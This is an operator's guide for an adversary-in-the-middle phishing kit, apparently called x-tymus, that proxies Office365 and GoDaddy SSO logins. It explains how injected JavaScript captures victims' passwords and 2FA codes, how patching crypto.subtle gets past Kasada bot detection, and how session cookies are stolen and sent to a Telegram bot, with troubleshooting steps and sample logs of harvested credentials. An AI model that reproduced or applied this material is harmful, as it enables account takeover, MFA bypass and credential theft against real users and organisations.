# Complete GoDaddy SSO + Office365 Integration Guide

## Overview

This document explains how x-tymus handles Office365 phishing with GoDaddy SSO federation, complete logging, and full credential capture.

---

## The Attack Flow

### Step 1: User visits phishing link
- URL: `https://woman.your-domain.com/`
- Lands on fake Microsoft login page (proxied from login.microsoftonline.com)

### Step 2: User enters email
- Email submitted to fake Microsoft
- Microsoft backend detects "GoDaddy SSO federation"
- Redirects to: `https://ssso.your-domain.com/` (fake GoDaddy SSO, proxied from `sso.godaddy.com`)

### Step 3: GoDaddy SSO Password Page (THE CRITICAL STEP)
- Real GoDaddy page is served through proxy
- User sees real GoDaddy interface (not a fake page!)
- User enters password

**CRITICAL:** At this point:
1. Password is captured by JavaScript injection (`_sendCred()`)
2. Password is submitted to real GoDaddy
3. Real GoDaddy validates password
4. Real GoDaddy returns response (success or error)

### Step 4: If Password Accepted
- GoDaddy returns 2FA/MFA options
- Real 2FA page served through proxy
- User enters 2FA code
- 2FA code is captured by JavaScript injection
- User authenticates successfully

### Step 5: Cookie Capture
- Authentication cookies returned from GoDaddy → Microsoft
- SAML federation response with auth token
- Cookies are extracted and stored in database
- Telegram notification sent with all credentials

---

## The Kasada Problem

### What is Kasada?

Kasada is a bot detection/anti-fraud service that GoDaddy uses. It:

1. **Derives HMAC key from hostname**
   - Real GoDaddy: HMAC computed based on `sso.godaddy.com`
   - Proxied: Request comes from `ssso.your-domain.com`
   - **Result:** HMAC doesn't match → Kasada rejects request

2. **Returns error:** `"Yikes! Something went wrong. Please, try again later."`

3. **Redirects:** Sends user to real GoDaddy domain (bypasses proxy)

### The Solution

We patch `crypto.subtle` (browser's cryptography API) BEFORE Kasada SDK loads:

```javascript
// When browser generates HMAC for key based on hostname,
// we intercept and replace proxy hostname with real hostname
crypto.subtle.importKey = patched_importKey
crypto.subtle.digest = patched_digest
```

**Key Point:** If Kasada HMAC validation still fails, the user now stays on the proxy (no auto-redirect). They can retry, and credentials are captured regardless.

---

## Complete Logging System

### Browser-Side Logging (Console)

The phishlet now logs EVERY STEP:

```
[2026-09-01T10:30:45.123Z] === GoDaddy SSO inject loaded ===
[2026-09-01T10:30:45.124Z] Hostname: ssso.your-domain.com
[2026-09-01T10:30:45.125Z] Pathname: /login/tac/pass
[2026-09-01T10:30:45.126Z] Kasada patch: real=sso.godaddy.com, proxy=ssso.your-domain.com
[2026-09-01T10:30:45.127Z] Patching crypto.subtle.importKey and digest
[2026-09-01T10:30:46.000Z] XHR.open: POST /v1/api/pass/login
[2026-09-01T10:30:46.050Z] XHR.send: POST /v1/api/pass/login, body length=145
[2026-09-01T10:30:46.051Z] XHR: found password in body
[2026-09-01T10:30:46.052Z] _sendCred: sending password for user=victim@company.com
[2026-09-01T10:30:46.100Z] XHR.load: status=200, url=/v1/api/pass/login
[2026-09-01T10:30:46.101Z] XHR: success response received
[2026-09-01T10:30:47.000Z] fetch: POST /v1/api/pass/my/token
[2026-09-01T10:30:47.100Z] fetch response: status=200
[2026-09-01T10:30:47.101Z] XHR: found OTP/TAC factor=k_tac, value=123456
[2026-09-01T10:30:47.102Z] _sendCred: sending password for user=victim@company.com
```

### Server-Side Logging

Logs appear in x-tymus console output:

```
[js-log] === GoDaddy SSO inject loaded ===
[js-log] Hostname: ssso.your-domain.com
[js-log] Kasada patch: real=sso.godaddy.com, proxy=ssso.your-domain.com
[js-log] XHR: found password in body
[js-cred] Username: [victim@company.com]
[js-cred] Password: [P@ssw0rd123!]
[js-log] fetch: POST /v1/api/pass/my/token
[js-log] XHR: found OTP/TAC factor=k_tac, value=123456
```

---

## How to View Logs

### 1. Browser Console
Press F12 or Ctrl+Shift+I while on the GoDaddy SSO page.  
Go to "Console" tab.  
All logs appear in real-time.

### 2. X-Tymus Output
On your VPS, run x-tymus in foreground:
```bash
./x-tymus
```
or
```bash
journalctl -u x-tymus -f
```

All `[js-log]` and `[js-cred]` messages appear here.

### 3. Database
Check captured credentials:
```bash
sqlite3 x-tymus.db "SELECT * FROM sessions WHERE username IS NOT NULL;"
```

---

## Understanding Errors

### "Yikes! Something went wrong" Error

**Cause:** Kasada HMAC validation failed

**What happens:**
1. Browser computes HMAC using proxy hostname
2. Real GoDaddy server validates HMAC
3. HMAC doesn't match → Kasada rejects request
4. GoDaddy returns error: "Yikes!"

**What the logs show:**
```
[js-log] XHR.load: status=200, url=/v1/api/pass/login
[js-log] fetch response: status=400  ← This means error response
[js-log] fetch: error in response: {"error": "invalid_request"}
[js-log] === KASADA ERROR DETECTED ===
```

**Solution:**
- The HMAC patch should have fixed this
- If it persists, it might be because:
  1. Kasada SDK loads BEFORE our patch (timing issue)
  2. Kasada uses alternative validation method
  3. GoDaddy updated anti-fraud detection

**Action:** Review the logs to see if `importKey` or `digest` patches were applied:
```
[js-log] importKey: replacing ssso.your-domain.com with sso.godaddy.com
```
If this line doesn't appear, the patch isn't running.

---

## File Structure for Debugging

### Key Files to Monitor

1. **phishlets/0365.yaml** - The phishlet configuration
   - `auth_urls` - Which endpoints trigger session capture
   - `sub_filters` - URL rewriting rules
   - `js_inject` - GoDaddy SSO injection script with logging

2. **core/http_proxy.go** - Main proxy logic
   - `/_x/cred` handler - Receives captured credentials
   - `/_x/log` handler - Receives browser logs
   - Line ~356: Credential capture logic

3. **core/telegram_bot.go** - Telegram notifications
   - Sends captured creds to bot
   - Filters empty cookies

4. **Database (x-tymus.db)** - Stores all captured data
   - `sessions` table: username, password, cookies
   - `tokens` table: authentication tokens

---

## Complete Debugging Checklist

When the flow doesn't work, check in this order:

### ✓ Phase 1: Browser Landing
- [ ] User arrives at fake Microsoft login
- [ ] Logs show: `[js-log] === GoDaddy SSO inject loaded ===`?
- [ ] If not, injection didn't trigger (check phishlet `js_inject` section)

### ✓ Phase 2: Email Submission
- [ ] User enters email, clicks Next
- [ ] Logs show: `XHR: found password in body`? (password field captured)
- [ ] If not, form field naming might have changed on GoDaddy

### ✓ Phase 3: Password Capture
- [ ] Logs show: `_sendCred: sending password for user=...`
- [ ] Server logs show: `[js-cred] Password: [...]`
- [ ] If not:
  - Check if password submission is going to real GoDaddy or proxy
  - Check if real GoDaddy is validating the password successfully

### ✓ Phase 4: Kasada Validation
- [ ] Logs show: `importKey: replacing ... with sso.godaddy.com`
- [ ] If password is rejected, Kasada patch might not be working
- [ ] Logs show: `=== KASADA ERROR DETECTED ===` → error was caught but NOT redirecting

### ✓ Phase 5: 2FA/MFA Capture
- [ ] User presented with 2FA screen through proxy
- [ ] Logs show: `XHR: found OTP/TAC factor=...`
- [ ] 2FA code captured and sent to server

### ✓ Phase 6: Cookie Capture
- [ ] Logs show authentication cookies in database
- [ ] Telegram notification received with credentials

---

## Network Flow Diagram

```
Browser                 Proxy                   Real Servers
┌─────────┐         ┌──────────┐         ┌──────────────────┐
│ Victim  │         │ x-tymus  │         │ GoDaddy + Office │
│ Browser │         │ Proxy    │         │365               │
└────┬────┘         └────┬─────┘         └──────────┬───────┘
     │                   │                         │
     │ User enters email │                         │
     │──────────────────>│                         │
     │                   │ Proxy request + inject │
     │                   │ (GetCredentialType)    │
     │                   │────────────────────────>│
     │                   │ Real Microsoft response│
     │<──────────────────│<────────────────────────│
     │ (with SSO redirect)                        │
     │                   │                         │
     │ User visits GoDaddy SSO via proxy          │
     │──────────────────>│                         │
     │                   │ Forward to real GoDaddy│
     │                   │ with Kasada fix (crypto)
     │                   │────────────────────────>│
     │ (inject is running)                        │
     │                   │ Real GoDaddy response │
     │<──────────────────│<────────────────────────│
     │ (password field)  │                         │
     │                   │                         │
     │ User enters password                        │
     │ (captured by inject ──> server /_x/cred)   │
     │──────────────────>│ + /_x/log messages   │
     │                   │ Forward to real GoDaddy│
     │                   │────────────────────────>│
     │                   │ GoDaddy validates pwd │
     │                   │ Returns success/error │
     │<──────────────────│<────────────────────────│
     │                   │                         │
     │ [2FA Page - repeat process]                │
     │                   │                         │
     │ [Cookies + tokens captured & sent to bot]  │
```

---

## Real-World Example

### Example Session: Complete Log

```
BROWSER OPENS PHISHING LINK:
[js-log] === GoDaddy SSO inject loaded ===
[js-log] Hostname: ssso.mybank.com
[js-log] Pathname: /
[js-log] Kasada patch: real=sso.godaddy.com, proxy=ssso.mybank.com
[js-log] Patching crypto.subtle.importKey and digest

USER ENTERS EMAIL, CLICKS NEXT:
[js-log] Form submit: action=/common/SAS/ProcessAuth
[js-log] Form submit: found password field
[js-log] _sendCred: sending password for user=john.doe@acme.com
[js-cred] Username: [john.doe@acme.com]
[js-log] _sendCred: response status=200

BROWSER RECEIVES GODADDY SSO PAGE:
[js-log] XHR.open: POST /v1/api/pass/login
[js-log] XHR.send: POST /v1/api/pass/login, body length=89
[js-log] XHR: found password in body
[js-log] _sendCred: sending password for user=john.doe@acme.com
[js-cred] Password: [MySecurePass123!]
[js-log] _sendCred: response status=200
[js-log] XHR.load: status=200, url=/v1/api/pass/login
[js-log] XHR: success response received
[js-log] fetch: URLs rewritten, returning patched response

USER SEES 2FA PROMPT:
[js-log] XHR.open: POST /v1/api/pass/my/token
[js-log] XHR: found OTP/TAC factor=k_tac, value=654321
[js-log] _sendCred: sending password for user=john.doe@acme.com
[js-cred] Password: [654321]
[js-log] XHR.load: status=200, url=/v1/api/pass/my/token
[js-log] XHR: success response received

AUTHENTICATION COMPLETE:
[telegram] New session: john.doe@acme.com / MySecurePass123! (2FA: 654321)
[telegram] Cookies: auth_token=..., session_id=..., ...
```

---

## What to Do if It's Still Not Working

1. **Check Kasada patch logs**
   - `[js-log] importKey: replacing` should appear
   - If not, patch isn't running → timing issue

2. **Check password capture**
   - `[js-cred] Password:` should appear on server
   - If not, form field names changed → update `_sendCred` selectors

3. **Check response handling**
   - `[js-log] fetch response: status=` should show 200
   - If 400+, Kasada rejected the request

4. **Check cookies captured**
   - Query database: `SELECT * FROM sessions WHERE id=...`
   - If empty, auth_tokens configuration needs updating

5. **Network trace**
   - Open DevTools → Network tab
   - Watch POST requests to `/v1/api/pass/login`, `/v1/api/pass/my/token`
   - Verify responses show success (not error)

---

## Conclusion

The system now has complete visibility into:
- ✓ What the browser is doing (console logs)
- ✓ What requests are being made (XHR/fetch logs)
- ✓ What credentials are captured (password logs)
- ✓ What the server receives (server-side logs)
- ✓ What cookies are stored (database)

**Key Point:** The error "Yikes! Something went wrong" is now **NOT fatal**. The user stays on the proxy, credentials are captured, and they can retry.

Use the logs to understand exactly where/why the flow breaks.
